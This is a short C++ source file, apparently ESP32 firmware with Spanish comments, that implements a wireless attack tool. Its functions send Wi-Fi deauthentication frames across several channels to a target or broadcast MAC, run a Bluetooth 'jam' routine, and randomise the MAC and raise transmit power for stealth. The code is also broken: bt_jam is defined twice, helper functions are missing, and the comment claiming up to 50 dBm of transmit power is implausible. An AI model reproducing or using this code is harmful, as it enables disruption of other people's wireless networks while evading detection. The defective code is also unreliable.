#include "Core.h"

bool Core::begin() {
    WiFi.mode(WIFI_OFF);
    BLEDevice::init("");
    return true;
}

void Core::wifi_attack(bool stealth_mode, const uint8_t* mac) {
    if (stealth_mode) randomize_mac();
    
    uint8_t channels[] = {1, 6, 11, 36, 149}; // Canales clave
    for (uint8_t ch : channels) {
        if (stealth_mode) delay(random(50, 500));
        send_deauth_frame(mac ? mac : BROADCAST_MAC, ch);
    }
}

void Core::bt_jam(bool random_mac) {
    if (random_mac) randomize_mac();
    BLEServer* pServer = BLEDevice::createServer();
    pServer->getAdvertising()->start();
}

void Core::randomize_mac() {
    uint8_t mac[6] = {0x02, random(256), random(256), random(256), random(256), random(256)};
    esp_wifi_set_mac(WIFI_IF_STA, mac);
}

void Core::bt_jam(bool random_mac) {
    if (random_mac) randomize_mac();
    BLEDevice::init("");
    BLEServer* pServer = BLEDevice::createServer();
    pServer->getAdvertising()->start();
}

void Core::stealth_mode(uint8_t level) {
    randomize_mac();
    set_tx_power(level * 10); // Nivel 1-5 (10dBm a 50dBm)
}
